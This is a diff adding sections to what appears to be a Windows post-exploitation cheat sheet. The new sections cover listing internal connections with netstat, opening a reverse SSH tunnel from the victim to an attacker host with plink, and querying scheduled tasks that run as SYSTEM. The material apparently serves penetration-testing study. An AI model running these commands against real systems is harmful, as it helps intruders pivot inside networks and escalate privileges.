@@ -136,6 +136,34 @@ C:\Program Files\Something Here\service.exe
 
 If you make sure one of these exists before the legitimate is called, you can get code execution.
 
+### Attacking From The Inside
+
+Some services can only be accessed from inside the victim itself. List all active network connections with:
+
+```bash
+netstat -ano
+```
+
+Then port forward to them using reverse ssh proxy.
+
++ [Putty](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
++ [Plink](https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe) <sup><sub>[[archive (32-bit)](assets/files/plink.exe)]
+
+```bash
+plink.exe -l $LUSER -pw $LPASS $LHOST -R $LPORT:127.0.0.1:$RPORT
+# L == Attacker
+# R == Victim
+```
+
+### Vulnerable Scheduled Tasks
+```bash
+# Victim
+schtasks /query /fo LIST /v > schtask.txt
+
+# Attacker
+cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+```
+
 ## Exfiltration
 
 + SSH Copy (scp)
